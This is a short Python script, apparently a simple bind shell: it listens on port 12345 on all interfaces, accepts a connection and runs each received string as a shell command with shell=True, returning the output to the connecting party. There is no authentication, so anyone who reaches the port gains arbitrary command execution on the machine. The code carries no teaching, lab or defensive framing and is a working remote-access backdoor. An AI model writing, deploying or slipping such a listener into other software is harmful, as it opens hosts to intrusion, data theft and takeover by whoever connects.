
import socket
import subprocess as sp

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_host = "0.0.0.0"
server_port = 12345
server_addr = (server_host, server_port)
server_socket.bind(server_addr)

server_socket.listen()
print(f"[+] server listening on port {server_port}")

while True:
    print(f"[+] waiting for connection")
    client_socket, client_addr = server_socket.accept()

    print("[+] connection accepted from {}:{}".format(*client_addr))

    while True:
        command = client_socket.recv(1024).decode()

        if "kill server" in command:
            break

        result = sp.run(command,
                        shell=True,
                        stdout=sp.PIPE,
                        stderr=sp.PIPE,
                        text=True
        )

        client_socket.sendall(result.stdout.encode())

    client_socket.close()
    break
